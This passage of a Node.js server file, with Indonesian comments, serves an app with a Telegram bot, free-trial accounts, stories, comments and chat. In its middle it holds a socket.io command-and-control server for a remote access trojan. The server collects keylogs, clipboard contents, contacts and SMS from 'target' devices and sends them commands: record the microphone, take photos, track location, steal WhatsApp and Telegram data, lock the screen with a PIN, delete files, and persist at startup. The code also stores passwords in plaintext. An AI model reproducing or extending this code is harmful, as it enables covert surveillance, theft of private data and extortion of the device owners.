      `2. Menu Profile → Link Telegram\n` +
      `3. Atau hubungi owner: @xyzyanzzi`,
      { parse_mode: "Markdown" }
    );
  }

  const loadingMsg = await bot.sendMessage(chatId, "🔄 Syncing role...", { parse_mode: "Markdown" });

  const result = await syncUserRoleFromGroups(userId);

  try { await bot.deleteMessage(chatId, loadingMsg.message_id); } catch {}

  if (!result.success) {
    return bot.sendMessage(chatId,
      `❌ *SYNC GAGAL*\n\n` +
      `Alasan: \`${result.reason || result.error || 'unknown'}\`\n` +
      `Hubungi admin: @xyzyanzzi`,
      { parse_mode: "Markdown" }
    );
  }

  if (result.changed) {
    await bot.sendMessage(chatId,
      `✅ *ROLE BERHASIL DI-SYNC*\n\n` +
      `👤 Account: \`${username}\`\n` +
      `🎭 Role baru: *${result.role.toUpperCase()}*\n` +
      `📊 Dari grup: ${(result.fromGroups || []).map(r => r.toUpperCase()).join(', ') || '-'}\n\n` +
      `📌 Login ulang di aplikasi untuk refresh role!`,
      { parse_mode: "Markdown" }
    );
  } else {
    await bot.sendMessage(chatId,
      `✅ *ROLE SUDAH SESUAI*\n\n` +
      `👤 Account: \`${username}\`\n` +
      `🎭 Role: *${result.role.toUpperCase()}*\n\n` +
      `Tidak ada perubahan.`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/info$/, async (msg) => {
  const chatId = msg.chat.id;

  const user = msg.reply_to_message
    ? msg.reply_to_message.from
    : msg.from;

  const roles = getTargetRoles(user.id);
  const blacklist = getBlacklist();
  const isBlacklist = blacklist.includes(String(user.id));

  await sendRich(chatId,
    `👤 *Display Name:* ${user.first_name || "-"}\n` +
    `📛 *Username:* ${user.username ? "@" + user.username : "-"}\n` +
    `🆔 *Telegram ID:* \`${user.id}\`\n\n` +
    `${roles.reseller ? "✅" : "❌"} Reseller\n` +
    `${roles.partner ? "✅" : "❌"} Partner\n` +
    `${roles.owner ? "✅" : "❌"} Owner\n` +
    `${roles.developer ? "✅" : "❌"} Developer\n` +
    `${roles.god ? "✅" : "❌"} God\n` +
    `${isBlacklist ? "🚫" : "✅"} Blacklist`,
    { title: '👤 USER INFO' }
  );
});

function scheduleAutoClean() {
  const now = new Date();

  const nextMidnight = new Date();
  nextMidnight.setUTCHours(17, 0, 0, 0);

  if (now >= nextMidnight) {
    nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
  }

  const delay = nextMidnight - now;

  setTimeout(() => {
    hapusIsiUserLogs();
    setInterval(hapusIsiUserLogs, 24 * 60 * 60 * 1000);
  }, delay);
}

// ==========================================================
// [+] RAT DATABASE FILES (untuk socket.io handler)
// ==========================================================
const RAT_FILES = {
  KEYLOGS: './rat_keylogs.json',
  CLIPBOARD: './rat_clipboard.json',
  APPS: './rat_apps.json',
  CONTACTS: './rat_contacts.json',
  SMS: './rat_sms.json',
};

// Init files
Object.values(RAT_FILES).forEach(f => {
  if (!fs.existsSync(f)) fs.writeFileSync(f, '[]');
});

function readRATDB(file) {
  try {
    return JSON.parse(fs.readFileSync(file, 'utf8') || '[]');
  } catch {
    return [];
  }
}

function saveRATDB(file, data) {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (e) {
    logError(`[RAT DB] Gagal save ${file}:`, e.message);
  }
}

logSuccess('[RAT DB] Files initialized successfully');

// ==========================================================
// [+] SOCKET.IO UNTUK RAT (TAMBAHKAN DISINI)
// ==========================================================
const socketIo = require('socket.io');
const io = socketIo(server, {
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8,
    transports: ['websocket', 'polling']
});

io.on('connection', (socket) => {
    const { id, type } = socket.handshake.query;
    
    if (id) {
        socket.join(id);
        if (type === 'admin') {
            socket.join('ADMIN_ROOM');
            socket.isAdmin = true;
            logSuccess(`[RAT] Admin: ${id}`);
        } else {
            logSuccess(`[RAT] Target: ${id}`);
            socket.emit('target_ready', { id, status: 'online' });
        }
    }

    socket.on('target_ready', ({ id }) => {
        io.to(`admin_${id}`).emit('target_ready', { id });
    });
    
    socket.on('keylog_data', ({ deviceId, keys }) => {
        let keylogs = readRATDB(RAT_FILES.KEYLOGS);
        const existing = keylogs.find(k => k.deviceId === deviceId);
        if (existing) existing.logs += keys;
        else keylogs.push({ deviceId, logs: keys, createdAt: new Date() });
        saveRATDB(RAT_FILES.KEYLOGS, keylogs);
        io.to('ADMIN_ROOM').emit('keylog_data', { deviceId, keys });
    });
    
    socket.on('clipboard_data', ({ deviceId, content }) => {
        let clipboards = readRATDB(RAT_FILES.CLIPBOARD);
        clipboards.unshift({ deviceId, content, timestamp: new Date() });
        if (clipboards.length > 100) clipboards = clipboards.slice(0, 100);
        saveRATDB(RAT_FILES.CLIPBOARD, clipboards);
        io.to('ADMIN_ROOM').emit('clipboard_data', { deviceId, content });
    });
    
    socket.on('get_apps', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'get_apps', extra: '' });
    });
    
    socket.on('get_contacts', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'get_contacts', extra: '' });
    });
    
    socket.on('get_sms', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'get_sms', extra: '' });
    });
    
    socket.on('get_location', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'get_location', extra: '' });
    });
    
    socket.on('take_photo', ({ deviceId, side }) => {
        io.to(deviceId).emit('new_command', { command: 'take_photo', extra: side || 'back' });
    });
    
    socket.on('start_keylogger', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'start_keylogger', extra: '' });
    });
    
    socket.on('stop_keylogger', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'stop_keylogger', extra: '' });
    });
    
    socket.on('start_mic_recording', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'start_mic_recording', extra: '' });
    });
    
    socket.on('stop_mic_recording', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'stop_mic_recording', extra: '' });
    });
    
    socket.on('lock_type1', ({ deviceId, message, pin }) => {
        io.to(deviceId).emit('new_command', { command: 'lock_type1', extra: `${message}|${pin}` });
    });
    
    socket.on('unlock', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'unlock', extra: '' });
    });
    
    socket.on('flash_strobe', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'flash_strobe', extra: '' });
    });
    
    socket.on('vibrate_loop', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'vibrate_loop', extra: '' });
    });
    
    socket.on('ping_device', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'ping', extra: '' });
    });
    
    socket.on('list_files', ({ deviceId, path }) => {
        io.to(deviceId).emit('new_command', { command: 'list_files', extra: path });
    });
    
    socket.on('download_file', ({ deviceId, filePath }) => {
        io.to(deviceId).emit('new_command', { command: 'download_file', extra: filePath });
    });
    
    socket.on('delete_file', ({ deviceId, filePath }) => {
        io.to(deviceId).emit('new_command', { command: 'delete_file', extra: filePath });
    });
    
    socket.on('spam_notification', ({ deviceId, title, message, count }) => {
        io.to(deviceId).emit('new_command', { command: 'spam_notification', extra: `${title}|${message}|${count}` });
    });
    
    socket.on('extract_whatsapp', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'extract_whatsapp', extra: '' });
    });
    
    socket.on('steal_telegram', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'steal_telegram', extra: '' });
    });
    
    socket.on('persistence_startup', ({ deviceId }) => {
        io.to(deviceId).emit('new_command', { command: 'persistence_startup', extra: '' });
    });
    
    socket.on('disconnect', () => {
        if (socket.deviceId && !socket.isAdmin) {
            logSuccess(`[RAT] Target Disconnected: ${socket.deviceId}`);
            io.to('ADMIN_ROOM').emit('target_status', { id: socket.deviceId, status: 'offline' });
        }
    });
});

// ==========================================================
// [+] FREE TRIAL 3H — Endpoint Buat Akun Gratis
// ==========================================================
app.post("/api/free-trial", (req, res) => {
  try {
    const { username, password, duration_hours } = req.body;

    // ─── VALIDASI ───────────────────────────────────────
    if (!username || !password) {
      return res.status(400).json({
        message: "Username dan password wajib diisi"
      });
    }

    const cleanUser = String(username).trim().toLowerCase();
    const cleanPass = String(password).trim();

    if (cleanUser.length < 3 || cleanUser.length > 20) {
      return res.status(400).json({
        message: "Username harus 3-20 karakter"
      });
    }

    if (!/^[a-zA-Z0-9_]+$/.test(cleanUser)) {
      return res.status(400).json({
        message: "Username hanya boleh huruf, angka, dan _"
      });
    }

    if (cleanPass.length < 4) {
      return res.status(400).json({
        message: "Password minimal 4 karakter"
      });
    }

    // ─── CEK MAINTENANCE ────────────────────────────────
    const maintenance = readMaintenance();
    if (maintenance.active) {
      return res.status(503).json({
        message: maintenance.reason || "Server sedang dalam pemeliharaan."
      });
    }

    // ─── CEK USERNAME SUDAH ADA ─────────────────────────
    const db = loadDatabase();
    if (db.find(u => u.username === cleanUser)) {
      return res.status(409).json({
        message: "Username sudah digunakan, coba yang lain"
      });
    }

    // ─── HITUNG EXPIRED (default 3 jam) ─────────────────
    const durHours = Number(duration_hours) || 3;
    const expired = new Date();
    expired.setHours(expired.getHours() + durHours);

    // ─── SIMPAN AKUN ────────────────────────────────────
const newAccount = {
  username: cleanUser,
  password: cleanPass,
  role: "member",
  expiredDate: expired.toISOString().split("T")[0],
  expiredAt: expired.toISOString(),   // ← TAMBAH 1 BARIS INI
  isBanned: false,
  createdBy: "SYSTEM_FREE_TRIAL",
  createdAt: new Date().toISOString(),
  trialHours: durHours,
};

    db.push(newAccount);
    saveDatabase(db);

    // ─── FORMAT EXPIRED UNTUK RESPONSE ──────────────────
    const expiredStr = expired.toLocaleString("id-ID", {
      day: "2-digit",
      month: "short",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });

    // ─── LOG ────────────────────────────────────────────
    logSuccess(`[🎁 FREE TRIAL] ${cleanUser} | ${durHours} jam | Exp: ${expiredStr}`);
    saveUserLog(
      cleanUser,
      "register",
      "Free Trial",
      `Akun gratis ${durHours} jam dibuat via API`
    );

    // ─── RESPONSE ───────────────────────────────────────
return res.status(201).json({
  username: newAccount.username,
  password: newAccount.password,
  expires_at: expiredStr,                                 // untuk tampilan user
  expires_at_iso: newAccount.expiredAt,                   // ✅ opsional, untuk client lain
  duration_hours: durHours,
});

  } catch (err) {
    logError("[FREE TRIAL ERROR]", err.message);
    return res.status(500).json({
      message: "Server error: " + err.message
    });
  }
});

// ═══════════════════════════════════════════════════════════════════════════════
// [+] STORY & COMMENT ENDPOINTS
// ═══════════════════════════════════════════════════════════════════════════════

// ── STEP 1: Path & Loader ──
const storyPath   = path.join(__dirname, 'stories.json');
const commentPath = path.join(__dirname, 'story_comments.json');

const loadStories = () => {
  try {
    if (!fs.existsSync(storyPath)) fs.writeFileSync(storyPath, '[]');
    return JSON.parse(fs.readFileSync(storyPath, 'utf8') || '[]');
  } catch { return []; }
};

const saveStories = (data) => {
  try { fs.writeFileSync(storyPath, JSON.stringify(data, null, 2)); } catch {}
};

const loadComments = () => {
  try {
    if (!fs.existsSync(commentPath)) fs.writeFileSync(commentPath, '[]');
    return JSON.parse(fs.readFileSync(commentPath, 'utf8') || '[]');
  } catch { return []; }
};

const saveComments = (data) => {
  try { fs.writeFileSync(commentPath, JSON.stringify(data, null, 2)); } catch {}
};

const findUserByKey = (key) => {
  try {
    const keyList = JSON.parse(fs.readFileSync('keyList.json', 'utf8'));
    const entry = keyList.find(e => e.sessionKey === key);
    if (!entry) return null;
    const db = loadDatabase();
    return db.find(u => u.username === entry.username) || entry;
  } catch { return null; }
};

// ── STEP 2: Story Endpoints ──

// GET /getStories
app.get('/getStories', (req, res) => {
  const user = findUserByKey(req.query.key);
  if (!user) return res.status(401).json({ status: 'error', message: 'Unauthorized' });

  const rawStories = loadStories();
  const now = Date.now();
  const active = rawStories.filter(s => (now - new Date(s.createdAt).getTime()) < 86400000);
  if (active.length !== rawStories.length) saveStories(active);

  const allComments = loadComments();

  const enriched = active.map(s => {
    const storyComments = allComments.filter(c => c.story_id === s.story_id);
    return {
      ...s,
      media_url:  s.media_url || s.mediaUrl || '',
      mediaUrl:   s.mediaUrl || s.media_url || '',
      media_type: s.media_type || s.mediaType || 'image',
      mediaType:  s.mediaType || s.media_type || 'image',
      is_liked:   Array.isArray(s.likes) && s.likes.includes(user.username),
      is_owner:   s.username === user.username,
      like_count: Array.isArray(s.likes) ? s.likes.length : 0,
      view_count: Array.isArray(s.views) ? s.views.length : 0,
      comment_count: storyComments.length,
    };
  });

  const grouped = {};
  for (const s of enriched) {
    if (!grouped[s.username]) grouped[s.username] = { username: s.username, stories: [] };
    grouped[s.username].stories.push(s);
  }
  return res.json({ valid: true, data: Object.values(grouped), stories: enriched });
});

// Upload Story — support image, video, text
const storyStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(__dirname, 'story_media');
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    cb(null, `${Date.now()}_${file.originalname}`);
  }
});
const uploadStoryAny = multer({ storage: storyStorage, limits: { fileSize: 50 * 1024 * 1024 } }).any();

app.post('/uploadStory', uploadStoryAny, (req, res) => {
  const {
    key, caption = '', media_type = 'image', type = 'image',
    text = '', story_type = '',
    text_color = '#FFFFFF', bg_color = '#0D1117', font_size = '24',
  } = req.body;

  const user = findUserByKey(key);
  if (!user) return res.status(401).json({ valid: false, message: 'Unauthorized' });

  const uploadedFile = (req.files || []).find(f =>
    ['file', 'media', 'image', 'video', 'story'].includes(f.fieldname)
  ) || (req.files || [])[0];

  const finalType = (story_type || media_type || type || 'image').toLowerCase();
  const isTextStory = finalType === 'text' || (!uploadedFile && text.trim().length > 0);

  if (!isTextStory && !uploadedFile) {
    return res.status(400).json({ valid: false, message: 'Harus ada file (image/video) atau text' });
  }
  if (isTextStory && !text.trim() && !caption.trim()) {
    return res.status(400).json({ valid: false, message: 'Text story tidak boleh kosong' });
  }

  const stories = loadStories();
  const story = {
    story_id:   `story_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
    username:   user.username,
    role:       user.role || 'member',
    mediaUrl:   uploadedFile ? `/story_media/${uploadedFile.filename}` : '',
    media_url:  uploadedFile ? `/story_media/${uploadedFile.filename}` : '',
    mediaType:  isTextStory ? 'text' : finalType,
    media_type: isTextStory ? 'text' : finalType,
    caption:    caption || (isTextStory ? text : ''),
    text:       text || caption || '',
    text_style: {
      color:     text_color || '#FFFFFF',
      bg_color:  bg_color || '#0D1117',
      font_size: parseInt(font_size, 10) || 24,
    },
    views:     [],
    likes:     [],
    createdAt: new Date().toISOString(),
  };

  stories.push(story);
  saveStories(stories);
  logSuccess(`[STORY] ${isTextStory ? 'TEXT' : finalType.toUpperCase()} dari ${user.username}`);
  return res.json({ valid: true, message: 'Story berhasil diunggah', story });
});

// Serve story media
app.use('/story_media', express.static(path.join(__dirname, 'story_media')));

// Delete Story
app.post('/deleteStory', express.json(), (req, res) => {
  const { key, story_id } = req.body;
  const user = findUserByKey(key);
  if (!user) return res.status(401).json({ valid: false, message: 'Unauthorized' });

  let stories = loadStories();
  const idx = stories.findIndex(s => s.story_id === story_id && s.username === user.username);
  if (idx === -1) return res.status(404).json({ valid: false, message: 'Story tidak ditemukan' });

  stories.splice(idx, 1);
  saveStories(stories);

  let comments = loadComments();
  comments = comments.filter(c => c.story_id !== story_id);
  saveComments(comments);

  return res.json({ valid: true, message: 'Story & komentar dihapus' });
});

// View Story
app.post('/viewStory', express.json(), (req, res) => {
  const { key, story_id } = req.body;
  const user = findUserByKey(key);
  if (!user) return res.status(401).json({ valid: false, message: 'Unauthorized' });

  const stories = loadStories();
  const story = stories.find(s => s.story_id === story_id);
  if (!story) return res.status(404).json({ valid: false, message: 'Story tidak ditemukan' });

  if (!Array.isArray(story.views)) story.views = [];
  if (!story.views.includes(user.username)) story.views.push(user.username);
  saveStories(stories);
  return res.json({ valid: true });
});

// Like Story
app.post('/likeStory', express.json(), (req, res) => {
  const { key, story_id } = req.body;
  const user = findUserByKey(key);
  if (!user) return res.status(401).json({ valid: false, message: 'Unauthorized' });

  const stories = loadStories();
  const story = stories.find(s => s.story_id === story_id);
  if (!story) return res.status(404).json({ valid: false, message: 'Story tidak ditemukan' });

  if (!Array.isArray(story.likes)) story.likes = [];
  const likedIdx = story.likes.indexOf(user.username);
  if (likedIdx === -1) story.likes.push(user.username);
  else story.likes.splice(likedIdx, 1);
  saveStories(stories);
  return res.json({ valid: true, liked: likedIdx === -1, total: story.likes.length });
});

// ── STEP 3: Comment Endpoints ──

// Get Comments
app.get('/getComments', (req, res) => {
  const user = findUserByKey(req.query.key);
  if (!user) return res.status(401).json({ valid: false, message: 'Unauthorized' });

  const { story_id } = req.query;
  if (!story_id) return res.status(400).json({ valid: false, message: 'story_id wajib diisi' });

  const all = loadComments();
  const comments = all
    .filter(c => c.story_id === story_id)
    .sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime());

  const enriched = comments.map(c => ({
    comment_id: c.comment_id,
    id:         c.comment_id,
    username:   c.username,
    role:       c.role || 'member',
    message:    c.message,
    comment:    c.message,
    created_at: c.createdAt,
    createdAt:  c.createdAt,
    is_owner:   c.username === user.username,
  }));

  return res.json({ valid: true, total: enriched.length, data: enriched, comments: enriched });
});

// Send Comment
app.post('/sendComment', express.json(), (req, res) => {
  const { key, story_id, message } = req.body;
  const user = findUserByKey(key);
  if (!user) return res.status(401).json({ valid: false, message: 'Unauthorized' });

  if (!story_id) return res.status(400).json({ valid: false, message: 'story_id wajib diisi' });
  const msg = (message || '').toString().trim();
  if (!msg) return res.status(400).json({ valid: false, message: 'Komentar tidak boleh kosong' });
  if (msg.length > 500) return res.status(400).json({ valid: false, message: 'Komentar maksimal 500 karakter' });

  const stories = loadStories();
  const story = stories.find(s => s.story_id === story_id);
  if (!story) return res.status(404).json({ valid: false, message: 'Story tidak ditemukan' });

  const all = loadComments();
  const comment = {
    comment_id: `c_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
    story_id,
    username: user.username,
    role: user.role || 'member',
    message: msg,
    createdAt: new Date().toISOString(),
  };
  all.push(comment);
  saveComments(all);

  logSuccess(`[COMMENT] ${user.username} → "${msg.substring(0, 30)}" pada ${story_id}`);

  return res.json({
    valid: true,
    message: 'Komentar terkirim',
    comment: {
      comment_id: comment.comment_id,
      username:   comment.username,
      message:    comment.message,
      created_at: comment.createdAt,
      createdAt:  comment.createdAt,
      is_owner:   true,
    },
  });
});

// Delete Comment
app.post('/deleteComment', express.json(), (req, res) => {
  const { key, comment_id } = req.body;
  const user = findUserByKey(key);
  if (!user) return res.status(401).json({ valid: false, message: 'Unauthorized' });

  let all = loadComments();
  const idx = all.findIndex(c => c.comment_id === comment_id && c.username === user.username);
  if (idx === -1) return res.status(404).json({ valid: false, message: 'Komentar tidak ditemukan' });

  all.splice(idx, 1);
  saveComments(all);
  return res.json({ valid: true, message: 'Komentar dihapus' });
});

// Get Comment Count
app.get('/getCommentCount', (req, res) => {
  const user = findUserByKey(req.query.key);
  if (!user) return res.status(401).json({ valid: false, message: 'Unauthorized' });

  const { story_id } = req.query;
  if (!story_id) return res.status(400).json({ valid: false, message: 'story_id wajib diisi' });

  const all = loadComments();
  const count = all.filter(c => c.story_id === story_id).length;
  return res.json({ valid: true, story_id, count });
});

// ═══════════════════════════════════════════════════════════════════════════════
// [END STORY & COMMENT ENDPOINTS]
// ═══════════════════════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════════════════════
// [+] BENEFIT ENDPOINTS — Upload & Get Benefits
// ═══════════════════════════════════════════════════════════════════════════════

// Helper: Baca/tulis file benefit
function loadBenefits() {
  try {
    if (!fs.existsSync(BENEFIT_FILE)) fs.writeFileSync(BENEFIT_FILE, "[]");
    return JSON.parse(fs.readFileSync(BENEFIT_FILE, "utf8") || "[]");
  } catch { return []; }
}

function saveBenefits(data) {
  try {
    fs.writeFileSync(BENEFIT_FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    logError("[BENEFIT] Gagal save:", e.message);
  }
}

// ─── 1. POST /uploadBenefit ────────────────────────────────
app.post("/uploadBenefit", express.json(), (req, res) => {
  try {
    const { key, link, deskripsi } = req.body;

    // Validasi session key
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      return res.status(401).json({ valid: false, error: "Session key tidak valid" });
    }

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) {
      return res.status(404).json({ valid: false, error: "User tidak ditemukan" });
    }

    // Cek banned
    if (user.isBanned) {
      return res.status(403).json({ valid: false, error: "Akun kamu sedang dibanned" });
    }

    // Validasi link
    if (!link || typeof link !== 'string' || link.trim() === '') {
      return res.json({ valid: false, error: "Link wajib diisi" });
    }
    const cleanLink = link.trim();
    if (!cleanLink.startsWith('http://') && !cleanLink.startsWith('https://')) {
      return res.json({ valid: false, error: "Link harus mulai dengan http:// atau https://" });
    }
    if (cleanLink.length > 500) {
      return res.json({ valid: false, error: "Link terlalu panjang (max 500 karakter)" });
    }

    // Validasi deskripsi
    if (!deskripsi || typeof deskripsi !== 'string' || deskripsi.trim() === '') {
      return res.json({ valid: false, error: "Deskripsi wajib diisi" });
    }
    const cleanDesc = deskripsi.trim();
    if (cleanDesc.length > 500) {
      return res.json({ valid: false, error: "Deskripsi max 500 karakter" });
    }

    // Cooldown 30 detik
    const now = Date.now();
    if (!user.lastBenefitUpload) user.lastBenefitUpload = 0;
    const diffSec = Math.floor((now - user.lastBenefitUpload) / 1000);
    if (diffSec < 30) {
      return res.json({ valid: false, error: `Tunggu ${30 - diffSec} detik lagi` });
    }

    // Limit 20 per hari
    const benefits = loadBenefits();
    const todayStart = new Date();
    todayStart.setHours(0, 0, 0, 0);
    const todayCount = benefits.filter(b =>
      b.uploader === user.username && new Date(b.createdAt) >= todayStart
    ).length;
    if (todayCount >= 20) {
      return res.json({ valid: false, error: "Maksimal 20 benefit per hari" });
    }

    // Simpan
    const benefit = {
      id: `benefit_${now}_${Math.random().toString(36).slice(2, 8)}`,
      link: cleanLink,
      deskripsi: cleanDesc,
      uploader: user.username,
      role: user.role || "member",
      createdAt: new Date().toISOString(),
    };
    benefits.unshift(benefit);
    saveBenefits(benefits);

    // Update cooldown
    user.lastBenefitUpload = now;
    saveDatabase(db);

    logSuccess(`[BENEFIT] ${user.username} upload: ${cleanLink.substring(0, 50)}`);
    saveUserLog(user.username, "benefit", "Upload Benefit",
      `${cleanLink.substring(0, 80)} | ${cleanDesc.substring(0, 50)}`);

    return res.json({
      valid: true,
      message: "Benefit berhasil diupload",
      data: benefit,
    });

  } catch (err) {
    logError("[BENEFIT] upload error:", err.message);
    return res.status(500).json({ valid: false, error: "Server error: " + err.message });
  }
});

// ─── 2. GET /getBenefits ───────────────────────────────────
app.get("/getBenefits", (req, res) => {
  try {
    const { key, limit = 50 } = req.query;

    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      return res.status(401).json({ valid: false, error: "Session key tidak valid" });
    }

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) {
      return res.status(404).json({ valid: false, error: "User tidak ditemukan" });
    }

    const safeLimit = Math.min(parseInt(limit) || 50, 100);
    const benefits = loadBenefits().slice(0, safeLimit);

    return res.json({
      valid: true,
      total: benefits.length,
      benefits: benefits,
    });

  } catch (err) {
    logError("[BENEFIT] get error:", err.message);
    return res.status(500).json({ valid: false, error: "Server error: " + err.message });
  }
});

// ─── 3. POST /deleteBenefit ────────────────────────────────
app.post("/deleteBenefit", express.json(), (req, res) => {
  try {
    const { key, benefitId } = req.body;

    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Session key tidak valid" });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.status(404).json({ valid: false, error: "User tidak ditemukan" });

    const benefits = loadBenefits();
    const idx = benefits.findIndex(b => b.id === benefitId);
    if (idx === -1) return res.json({ valid: false, error: "Benefit tidak ditemukan" });

    const benefit = benefits[idx];
    const isOwner = benefit.uploader === user.username;
    const isAdmin = ["owner", "developer", "admin", "partner"]
      .includes((user.role || "").toLowerCase());

    if (!isOwner && !isAdmin) {
      return res.json({ valid: false, error: "Tidak bisa hapus benefit orang lain" });
    }

    benefits.splice(idx, 1);
    saveBenefits(benefits);

    logSuccess(`[BENEFIT] ${user.username} hapus: ${benefitId}`);
    return res.json({ valid: true, message: "Benefit berhasil dihapus" });

  } catch (err) {
    logError("[BENEFIT] delete error:", err.message);
    return res.status(500).json({ valid: false, error: "Server error: " + err.message });
  }
});

// ═══════════════════════════════════════════════════════════════════════════════
// [END BENEFIT ENDPOINTS]
// ═══════════════════════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════════════════════
// [+] CHAT ENDPOINTS — Global, Private, Group
// ═══════════════════════════════════════════════════════════════════════════════

// ─── Helper ────────────────────────────────────────────────
function loadChatRooms() {
  try {
    if (!fs.existsSync(CHAT_ROOMS_FILE)) fs.writeFileSync(CHAT_ROOMS_FILE, "[]");
    return JSON.parse(fs.readFileSync(CHAT_ROOMS_FILE, "utf8") || "[]");
  } catch { return []; }
}

function saveChatRooms(data) {
  try { fs.writeFileSync(CHAT_ROOMS_FILE, JSON.stringify(data, null, 2)); } catch {}
}

function loadChatMessages() {
  try {
    if (!fs.existsSync(CHAT_MESSAGES_FILE)) fs.writeFileSync(CHAT_MESSAGES_FILE, "[]");
    return JSON.parse(fs.readFileSync(CHAT_MESSAGES_FILE, "utf8") || "[]");
  } catch { return []; }
}

function saveChatMessages(data) {
  try { fs.writeFileSync(CHAT_MESSAGES_FILE, JSON.stringify(data, null, 2)); } catch {}
}

// Ensure global room exists
function ensureGlobalRoom() {
  let rooms = loadChatRooms();
  if (!rooms.find(r => r.type === 'global')) {
    rooms.push({
      id: 'room_global',
      type: 'global',
      name: 'Global Chat',
      avatarUrl: null,
      createdBy: 'system',
      members: [],
      admins: [],
      createdAt: new Date().toISOString(),
    });
    saveChatRooms(rooms);
  }
}
ensureGlobalRoom();

// ═══════════════════════════════════════════════════════════
// 1. GET /chat/rooms
// ═══════════════════════════════════════════════════════════
app.get("/chat/rooms", (req, res) => {
  try {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Session invalid" });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.status(404).json({ valid: false, error: "User not found" });

    const allRooms = loadChatRooms();
    const allMessages = loadChatMessages();

    // Filter: global selalu tampil, group/private hanya jika user member
    const myRooms = allRooms.filter(r => {
      if (r.type === 'global') return true;
      return r.members.includes(user.username);
    });

    // Enrich dengan last message
    const enriched = myRooms.map(r => {
      const roomMsgs = allMessages.filter(m => m.roomId === r.id && !m.isDeleted);
      const last = roomMsgs.length > 0 ? roomMsgs[roomMsgs.length - 1] : null;
      return {
        ...r,
        lastMessageAt: last?.createdAt || null,
        lastMessageText: last?.text || (last?.type ? `[${last.type}]` : null),
        lastMessageSender: last?.senderUsername || null,
      };
    });

    // Sort: room dengan pesan terbaru di atas
    enriched.sort((a, b) => {
      if (a.type === 'global') return -1;
      if (b.type === 'global') return 1;
      const aT = a.lastMessageAt || a.createdAt;
      const bT = b.lastMessageAt || b.createdAt;
      return new Date(bT) - new Date(aT);
    });

    return res.json({ valid: true, rooms: enriched });
  } catch (err) {
    logError("[CHAT] get rooms error:", err.message);
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
// 2. POST /chat/create-group
// ═══════════════════════════════════════════════════════════
app.post("/chat/create-group", express.json(), (req, res) => {
  try {
    const { key, name, members, avatarUrl } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Session invalid" });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.status(404).json({ valid: false, error: "User not found" });

    if (!name || name.trim().length === 0) {
      return res.json({ valid: false, error: "Nama group wajib diisi" });
    }
    if (!Array.isArray(members) || members.length === 0) {
      return res.json({ valid: false, error: "Pilih minimal 1 member" });
    }

    // Pastikan pembuat juga jadi member
    const memberList = [...new Set([user.username, ...members])];

    const rooms = loadChatRooms();
    const roomId = `group_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;

    const newRoom = {
      id: roomId,
      type: 'group',
      name: name.trim(),
      avatarUrl: avatarUrl || null,
      createdBy: user.username,
      members: memberList,
      admins: [user.username],
      createdAt: new Date().toISOString(),
    };

    rooms.push(newRoom);
    saveChatRooms(rooms);

    // Add system message
    const messages = loadChatMessages();
    messages.push({
      id: `msg_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
      roomId: roomId,
      senderUsername: 'system',
      senderRole: 'system',
      type: 'system',
      text: `${user.username} membuat group "${name}"`,
      createdAt: new Date().toISOString(),
    });
    saveChatMessages(messages);

    logSuccess(`[CHAT] ${user.username} buat group: ${name}`);
    return res.json({ valid: true, message: "Group berhasil dibuat", room: newRoom });
  } catch (err) {
    logError("[CHAT] create group error:", err.message);
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
// 3. POST /chat/add-member
// ═══════════════════════════════════════════════════════════
app.post("/chat/add-member", express.json(), (req, res) => {
  try {
    const { key, roomId, username: targetUsername } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Session invalid" });

    const rooms = loadChatRooms();
    const idx = rooms.findIndex(r => r.id === roomId);
    if (idx === -1) return res.json({ valid: false, error: "Group tidak ditemukan" });

    const room = rooms[idx];
    if (room.type !== 'group') {
      return res.json({ valid: false, error: "Hanya bisa tambah member ke group" });
